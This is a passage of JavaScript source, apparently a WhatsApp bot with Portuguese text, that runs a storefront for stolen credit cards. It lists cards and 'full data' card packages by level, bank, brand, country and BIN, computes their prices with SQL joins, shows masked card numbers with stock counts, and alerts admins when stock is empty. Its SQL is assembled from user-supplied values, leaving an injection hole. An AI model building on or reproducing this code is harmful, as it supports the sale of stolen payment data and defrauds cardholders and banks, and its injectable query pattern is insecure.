                        CONSTRUCAO_LISTMESSAGE_rows.push(
                            {
                                rowId: `${iD_Footer.toString()}|ccs_pacote|Opcoes_Pacote_CCs_BANDEIRA`,
                                title: "📦 PCTs por BANDEIRA",
                                description: "Compre pacotes de CCs de apenas um tipo de bandeira.",
                            },
                        )
                    }
                    if (VENDER_PACOTE_BIN === "1") {
                        CONSTRUCAO_LISTMESSAGE_rows.push(
                            {
                                rowId: `${iD_Footer.toString()}|ccs_pacote|Opcoes_Pacote_CCs_BIN`,
                                title: "📦 PCTs por BIN",
                                description: "Compre pacotes de CCs de apenas um tipo de bin.",
                            },
                        )
                    }
                }

                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendListMessage',
'${CONSTRUCAO_LISTMESSAGE_description}',
'${CONSTRUCAO_LISTMESSAGE_buttonText}',
'${CONSTRUCAO_LISTMESSAGE_title}',
'${JSON.stringify(CONSTRUCAO_LISTMESSAGE_rows)}',
'${iD_Footer}',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));

            } else {


                //                 CATEGORIA = "NIVEL"
                //                 Categorias = await DataBase_Better.prepare(`SELECT _rowid_,${CATEGORIA},VALOR FROM CCs_PRECOS_${CATEGORIA}`).all()
                //                 if (Categorias.length === 0) {
                //                     Texto_Sem_Estoque = `*INFELIZMENTE ESTAMOS SEM MATERIAL NO ESTOQUE, NOSSA EQUIPE FOI NOTIFICADA!*`
                //                     await client.sendText(Mensagem_From, Texto_Sem_Estoque).then(async (result) => {
                //                         Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
                //                     }).catch(async(erro) => {
                //                         console.log(debugLine("Error when sending = " + (JSON.stringify(error))));
                //                     });

                //                     for await (adm of Adms) {
                //                         Texto = `⚠️ *ATENÇÃO ADM* ⚠️

                // Usuário: wa.me/${Numero}

                // Tentou efetuar a compra de CCs, mas o estoque está vazio!`
                //                         await client.sendText(`${adm}@c.us`, Texto).then(async (result) => {
                //                             Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
                //                         }).catch(async(erro) => {
                //                             console.log(debugLine("Error when sending = " + (JSON.stringify(error))));
                //                         });
                //                     }
                //                     return
                //                 }
                //                 Categorias.sort();

                //                 Array_Botoes = []
                //                 Array_Botoes.push("*CCs POR NÍVEL*\n")

                //                 for await (Categoria of Categorias) {
                //                     Estoque = await Obter_Estoque(Categoria, CATEGORIA)
                //                     if (parseInt(Estoque[0]["COUNT(*)"]) != 0) {

                //                         try {
                //                             VALOR_CATEGORIA = await DataBase_Better.prepare(`SELECT VALOR FROM CCs_PRECOS_${CATEGORIA} WHERE ${CATEGORIA} = '${Categorias[Categorias.indexOf(Categoria)][CATEGORIA]}'`).get()["VALOR"]
                //                             VALOR_CATEGORIA = parseFloat(VALOR_CATEGORIA).toFixed(2)
                //                         } catch (error) {
                //                             Texto = `Ocorreu algum erro...`
                //                             await client.sendText(Mensagem_From, Texto).then(async (result) => {
                //                                 Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
                //                             }).catch(async(erro) => {
                //                                 console.log(debugLine("Error when sending = " + (JSON.stringify(error))));
                //                             });
                //                             return
                //                         }
                //                         try {
                //                             Nome_Nivel = Categorias[Categorias.indexOf(Categoria)][CATEGORIA]
                //                             Nome_Nivel = Nome_Nivel.split(" ")
                //                             Array_Botoes.push(`*${Categorias[Categorias.indexOf(Categoria)][CATEGORIA]}* [Estoque: ${Estoque[0]["COUNT(*)"]}]
                // Digite /comprarcc${Nome_Nivel[0].toLowerCase()}\n`)
                //                         } catch (error) {
                //                             await Menu(client, Numero, Mensagem_From)
                //                             Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
                //                         }
                //                     }
                //                 }

                //                 Texto = `${Array_Botoes.join("\n")}`
                //                 await client.sendText(Mensagem_From, Texto).then(async (result) => {
                //                     Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
                //                 }).catch(async(erro) => {
                //                     console.log(debugLine("Error when sending = " + (JSON.stringify(error))));
                //                 });
                //                 return
            }
            return
        }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳

        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀
        if (Mensagem_ID_Lista_Array_Partes[1] === "unidade_ccs") {
            iD_Footer = Date.now()

            if (Mensagem_ID_Lista_Array_Partes[2] === "fulldados") {
                TIPOCC = "2"
            } else {
                TIPOCC = "1"
            }

            CATEGORIA = ""
            if (Mensagem_ID_Lista_Array_Partes[3] === "nivel") {
                CATEGORIA = "NIVEL"
            }
            if (Mensagem_ID_Lista_Array_Partes[3] === "banco") {
                CATEGORIA = "BANCO"
            }
            if (Mensagem_ID_Lista_Array_Partes[3] === "bandeira") {
                CATEGORIA = "BANDEIRA"
            }
            if (Mensagem_ID_Lista_Array_Partes[3] === "pais") {
                CATEGORIA = "PAIS"
            }
            if (Mensagem_ID_Lista_Array_Partes[3] === "bin") {
                CATEGORIA = "BIN"
                Texto = `Caso queria *Pesquisar por BIN*, só digitar /bin e sua bin

*Exemplo:*

/bin 376334`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));

            }

            if (TIPOCC.toString() === "1") {
                Categorias = await DataBase_Better.prepare(`SELECT _rowid_,${CATEGORIA},VALOR FROM CCs_PRECOS_${CATEGORIA}`).all()
            } else {
                Categorias = await DataBase_Better.prepare(`SELECT _rowid_,${CATEGORIA},VALOR FROM CCs_PRECOS_${CATEGORIA}_FULL`).all()
            }
            if (Categorias.length === 0) {
                if (TIPOCC.toString() === "1") {
                    Texto_Sem_Estoque = `*INFELIZMENTE ESTAMOS SEM MATERIAL NO ESTOQUE, NOSSA EQUIPE FOI NOTIFICADA!*`
                } else {
                    Texto_Sem_Estoque = `*INFELIZMENTE ESTAMOS SEM MATERIAL FULL DADOS NO ESTOQUE, NOSSA EQUIPE FOI NOTIFICADA!*`
                }

                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto_Sem_Estoque}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()


                for await (adm of Adms) {
                    await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3_ADMS_GRUPOS (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${adm}@c.us',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                }


                if (TIPOCC.toString() === "1") {
                    Texto = `⚠️ *ATENÇÃO ADM* ⚠️

Usuário: wa.me/${Numero}

Tentou efetuar a compra de CCs, mas o estoque está vazio!`
                } else {
                    Texto = `⚠️ *ATENÇÃO ADM* ⚠️

Usuário: wa.me/${Numero}

Tentou efetuar a compra de CCs *FULL DADOS*, mas o estoque está vazio!`
                }
                for await (adm of Adms) {
                    await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3_ADMS_GRUPOS (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${adm}@c.us'
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                }
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
            }
            Categorias.sort();

            CONSTRUCAO_LISTMESSAGE_buttonText = "OPÇÕES"
            CONSTRUCAO_LISTMESSAGE_title = `CCs POR ${CATEGORIA}`

            CONSTRUCAO_LISTMESSAGE_rows = []
            iD_Footer = Date.now()

            for await (Categoria of Categorias) {
                Estoque = await DataBase_Better.prepare(`SELECT * FROM CCS WHERE ${CATEGORIA} = '${Categoria[CATEGORIA]}' AND TIPOCC = '${TIPOCC}'`).all()
                if (parseInt(Estoque.length) != 0) {

                    try {
                        if (TIPOCC.toString() === "1") {
                            VALOR_CATEGORIA = await DataBase_Better.prepare(`SELECT VALOR FROM CCs_PRECOS_${CATEGORIA} WHERE ${CATEGORIA} = '${Categorias[Categorias.indexOf(Categoria)][CATEGORIA]}'`).get()["VALOR"]
                        } else {
                            VALOR_CATEGORIA = await DataBase_Better.prepare(`SELECT VALOR FROM CCs_PRECOS_${CATEGORIA}_FULL WHERE ${CATEGORIA} = '${Categorias[Categorias.indexOf(Categoria)][CATEGORIA]}'`).get()["VALOR"]
                        }
                        VALOR_CATEGORIA = parseFloat(VALOR_CATEGORIA).toFixed(2)
                    } catch (error) {
                        Texto = `Ocorreu algum erro...`
                        await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                        Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
                    }
                    if (TIPOCC.toString() === "1") {
                        try {
                            CONSTRUCAO_LISTMESSAGE_rows.push({
                                rowId: `${iD_Footer.toString()}|ccs_tipo_estoque|infocc|${CATEGORIA}|${Categorias[Categorias.indexOf(Categoria)][CATEGORIA]}`,
                                title: Categorias[Categorias.indexOf(Categoria)][CATEGORIA],
                                description: `Estoque: ${Estoque.length}`
                            })
                        } catch (error) {
                            await Menu(client, Numero, Mensagem_From)
                            Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
                        }
                    } else {
                        try {
                            CONSTRUCAO_LISTMESSAGE_rows.push({
                                rowId: `${iD_Footer.toString()}|ccs_tipo_estoque|fulldados|${CATEGORIA}|${Categorias[Categorias.indexOf(Categoria)][CATEGORIA]}`,
                                title: Categorias[Categorias.indexOf(Categoria)][CATEGORIA],
                                description: `Estoque: ${Estoque.length}`
                            })
                        } catch (error) {
                            await Menu(client, Numero, Mensagem_From)
                            Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
                        }

                    }
                }
            }

            //console.log(CONSTRUCAO_LISTMESSAGE_rows)
            if (CONSTRUCAO_LISTMESSAGE_rows.length === 0) {
                Texto = `*INFELIZMENTE ESTAMOS SEM MATERIAL NO ESTOQUE, NOSSA EQUIPE FOI NOTIFICADA!*`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()

                if (TIPOCC.toString() === "1") {
                    Texto = `⚠️ *ATENÇÃO ADM* ⚠️

Usuário: wa.me/${Numero}

Tentou efetuar a compra de CCs, mas o estoque está vazio!`
                } else {
                    Texto = `⚠️ *ATENÇÃO ADM* ⚠️

Usuário: wa.me/${Numero}

Tentou efetuar a compra de CCs FULL DADOS, mas o estoque está vazio!`
                }
                for await (adm of Adms) {
                    for await (adm of Adms) {
                        await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3_ADMS_GRUPOS (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${adm}@c.us',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                    }
                }
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
            }

            if (TIPOCC.toString() === "1") {
                CONSTRUCAO_LISTMESSAGE_description = `*CCs POR ${CATEGORIA}*`
            } else {
                CONSTRUCAO_LISTMESSAGE_description = `*CCs FULLDADOS POR ${CATEGORIA}*`
            }
            await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendListMessage',
'${CONSTRUCAO_LISTMESSAGE_description}',
'${CONSTRUCAO_LISTMESSAGE_buttonText}',
'${CONSTRUCAO_LISTMESSAGE_title}',
'${JSON.stringify(CONSTRUCAO_LISTMESSAGE_rows)}',
'${iD_Footer}',
'${Date.now()}')`).run()
            Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳

        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀
        if (Mensagem_ID_Lista_Array_Partes[1] === "ccs_tipo_estoque") {
            iD_Footer = Date.now()

            if (Mensagem_ID_Lista_Array_Partes[2] === "fulldados") {
                TIPOCC = "2"
            } else {
                TIPOCC = "1"
            }

            if (Mensagem_ID_Lista_Array_Partes[3] === "NIVEL") {
                CATEGORIA = "NIVEL"
            }
            if (Mensagem_ID_Lista_Array_Partes[3] === "BANCO") {
                CATEGORIA = "BANCO"
            }
            if (Mensagem_ID_Lista_Array_Partes[3] === "BANDEIRA") {
                CATEGORIA = "BANDEIRA"
            }
            if (Mensagem_ID_Lista_Array_Partes[3] === "PAIS") {
                CATEGORIA = "PAIS"
            }
            if (Mensagem_ID_Lista_Array_Partes[3] === "BIN") {
                CATEGORIA = "BIN"
            }

            PARAMETRO = Mensagem_ID_Lista_Array_Partes[4]

            Array_CCs = await DataBase_Better.prepare(`SELECT _rowid_,* FROM CCS WHERE ${CATEGORIA} = '${PARAMETRO}' AND TIPOCC = '${TIPOCC}'`).all()
            console.log(`CATEGORIA:${CATEGORIA} | PARAMETRO:${PARAMETRO} = Veio ${Array_CCs.length}`)

            if (Array_CCs.length === 0) {

                Texto = `Desculpe, estamos sem estoque deste tipo de CC, verifique as outras opções.`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));


            }

            if (TIPOCC.toString() === "1") {
                Full = ""
            } else {
                Full = "_FULL"
            }

            CONSTRUCAO_LISTMESSAGE_buttonText = "OPÇÕES"

            CONSTRUCAO_LISTMESSAGE_rows = []
            iD_Footer = Date.now()

            for await (item of Array_CCs) {
                NUMERO_CC = item["NUMERO"]
                Digito = NUMERO_CC.match(/./igm)
                BIN = `${Digito[0]}${Digito[1]}${Digito[2]}${Digito[3]}${Digito[4]}${Digito[5]}`
                console.log(BIN)
                VALOR_FINAL_CC = await DataBase_Better.prepare(`SELECT
CCS.*,
CCS_PRECOS_BANDEIRA${Full}.VALOR AS VL_BANDEIRA,
CCS_PRECOS_NIVEL${Full}.VALOR AS VL_NIVEL,
CCS_PRECOS_BANCO${Full}.VALOR AS VL_BANCO,
CCS_PRECOS_PAIS${Full}.VALOR AS VL_PAIS,
CCS_PRECOS_BIN${Full}.VALOR AS VL_BIN,
(
CCS_PRECOS_BANDEIRA${Full}.VALOR + CCS_PRECOS_NIVEL${Full}.VALOR + CCS_PRECOS_BANCO${Full}.VALOR + CCS_PRECOS_PAIS${Full}.VALOR + CCS_PRECOS_BIN${Full}.VALOR
) AS VL_TOTAL
FROM
CCS
LEFT JOIN CCS_PRECOS_BANDEIRA${Full} ON (
CCS.BANDEIRA = CCS_PRECOS_BANDEIRA${Full}.BANDEIRA
)

LEFT JOIN CCS_PRECOS_NIVEL${Full} ON (
CCS.NIVEL = CCS_PRECOS_NIVEL${Full}.NIVEL
)

LEFT JOIN CCS_PRECOS_BANCO${Full} ON (
CCS.BANCO = CCS_PRECOS_BANCO${Full}.BANCO
)

LEFT JOIN CCS_PRECOS_PAIS${Full} ON (
CCS.PAIS = CCS_PRECOS_PAIS${Full}.PAIS
)

LEFT JOIN CCS_PRECOS_BIN${Full} ON (
CCS.BIN = CCS_PRECOS_BIN${Full}.BIN
)
WHERE CCS_PRECOS_BIN${Full}.BIN = '${BIN}' LIMIT 1`).all()
                //console.log(`VALOR TOTAL DA BIN:${BIN} | R$:${VALOR_FINAL_CC[0]["VL_TOTAL"]}`)
                VALOR_FINAL_CC = VALOR_FINAL_CC[0]["VL_TOTAL"]

                Digito = NUMERO_CC.match(/./igm)
                CONSTRUCAO_LISTMESSAGE_rows.push({
                    rowId: `${iD_Footer.toString()}|comprarcc|${TIPOCC}|${item["rowid"]}`,
                    title: `${Digito[0]}${Digito[1]}${Digito[2]}${Digito[3]}${Digito[4]}${Digito[5]}##########`,
                    description: `💰PREÇO: R$:${VALOR_FINAL_CC}
💠${item["NIVEL"]}
🏛${item["BANCO"]}
🏳️${item["BANDEIRA"]}
🌍${item["PAIS"]}`
                })
            }

            if (TIPOCC.toString() === "1") {
                CONSTRUCAO_LISTMESSAGE_title = "CCs"
                CONSTRUCAO_LISTMESSAGE_description = `💳 *CCs* 💳

Clique em *Opções de CCs*, escolha a CC e ao selecionar e enviar, caso você possua saldo suficiente, você estará efetuando a compra.

⚠️*MUITA ATENÇÃO AO ESCOLHER A CC DESEJADA!*⚠️`
            } else {
                CONSTRUCAO_LISTMESSAGE_title = "CCs FULL DADOS"
                CONSTRUCAO_LISTMESSAGE_description = `💳 *CCs FULL DADOS* 💳

Clique em *Opções de CCs*, escolha a CC e ao selecionar e enviar, caso você possua saldo suficiente, você estará efetuando a compra.

⚠️*MUITA ATENÇÃO AO ESCOLHER A CC DESEJADA!*⚠️`
            }

            await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendListMessage',
'${CONSTRUCAO_LISTMESSAGE_description}',
'${CONSTRUCAO_LISTMESSAGE_buttonText}',
'${CONSTRUCAO_LISTMESSAGE_title}',
'${JSON.stringify(CONSTRUCAO_LISTMESSAGE_rows)}',
'${iD_Footer}',
'${Date.now()}')`).run()
            Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳

        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        // ID_CC_MODO_s = 0
        // if (Mensagem_Texto.indexOf("/comprarcc") > -1) {
        //     Nivel_CC_Temp = Mensagem_Texto.toString().replace(/\/comprarcc/igm, '');
        //     Array_CCs = await DataBase_Better.prepare(`SELECT _rowid_,* FROM CCS WHERE NIVEL LIKE '${Nivel_CC_Temp}' AND TIPOCC = '1' LIMIT 1`).all()
        //     if (Array_CCs.length === 0) {
        //         Texto_Sem_Estoque = `*O ESTOQUE DESTE NÍVEL ACABOU, ESCOLHA CCs DE OUTROS NÍVEIS.*`
        //         await client.sendText(Mensagem_From, Texto_Sem_Estoque).then(async (result) => {
        //             Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        //         }).catch(async(erro) => {
        //             console.log(debugLine("Error when sending = " + (JSON.stringify(error))));
        //         });
        //         return
        //     }
        //     ID_CC_MODO_s = Array_CCs[0]["rowid"]
        //     console.log("ID_CC_Temp")
        //     console.log(ID_CC_MODO_s)
        // }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳

